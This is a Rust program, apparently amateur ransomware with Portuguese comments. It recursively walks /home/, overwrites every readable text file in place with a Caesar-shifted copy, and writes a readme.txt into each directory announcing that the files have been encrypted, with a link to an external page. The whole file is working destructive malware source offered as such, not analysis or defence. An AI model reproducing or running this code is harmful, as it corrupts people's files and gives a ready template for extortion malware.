
use std::{fs,fs::File};    
use walkdir::WalkDir;
use std::path::PathBuf;
use std::thread;
use std::io::Write;
const Sistema: &str = "https://textdoc.co/y3HXoD9PVzsK8w2J\nseus arquivos foram todos criptografados\n";

fn main() {
    
    let root_dir = "/home/";
    let mut diretorios: Vec<PathBuf> = Vec::new();

    // Utilizando a função WalkDir::new para iniciar a caminhada recursiva
    for entry in WalkDir::new(root_dir).into_iter().filter_map(Result::ok) {
        let path = entry.path();
        if path.is_dir() {
            diretorios.push(path.to_path_buf());
        }
    }

    //println!("{:?}", diretorios);
    //let mut cont = 1;
    for c in diretorios{ 
        let arqs = c;
        

        if let Ok(_a) = thread::spawn(move ||  list_files_in_directory(&arqs)).join(){

        }
        else{
            continue;
        }
     }

   
}

fn list_files_in_directory(directory: &PathBuf) {
    
    //println!("{:?}", directory);
    match fs::read_dir(directory) {
        Ok(entries) => {
            //println!("{:?}", entries);
            for entry in entries {
                if let Ok(entry) = entry {
                    let path = entry.path();
                    if path.is_file() {
                        
                        if let Ok(a) = fs::read_to_string(&path){

                            
                            New_arq(&path, encrypt(a, 3));
                        }
                    }
                    else {
                        continue;
                        //println!("{:?}", path);
                    }
                }
            }
        }
        Err(e) => {
            //eprintln!("Erro ao ler o diretório {:?}: {}", directory, e);
        }


    }
    let mut readme = File::create(format!("{}/readme.txt",directory.to_string_lossy())).expect("0xf323");
    let a =  Sistema.as_bytes();
    readme.write(String::from_utf8_lossy(a).as_bytes()).expect("null0x3");

    
}


fn encrypt(texto: String ,  deslocamento: u8) -> String {
    let mut resultado = String::new();

    for caractere in texto.chars() {
        if caractere.is_ascii_alphabetic() {
            let maiuscula = caractere.is_ascii_uppercase();
            let base = if maiuscula { b'A' } else { b'a' };
            let deslocado = (caractere as u8 - base + deslocamento) % 26 + base;
            resultado.push(deslocado as char);
        } else {
            resultado.push(caractere);
        }
    }

    resultado
}



fn New_arq(caminho: &PathBuf, TextoCifrado: String){
    //let a = format!("{}.encr", caminho.to_string_lossy());
    let a = caminho;
    let mut arquivo_saida = File::create(a).expect("00xxf");
    
    arquivo_saida.write_all(TextoCifrado.as_bytes()).expect("00xff3");
    
}

// Falhei em umas coisas mais funciona.
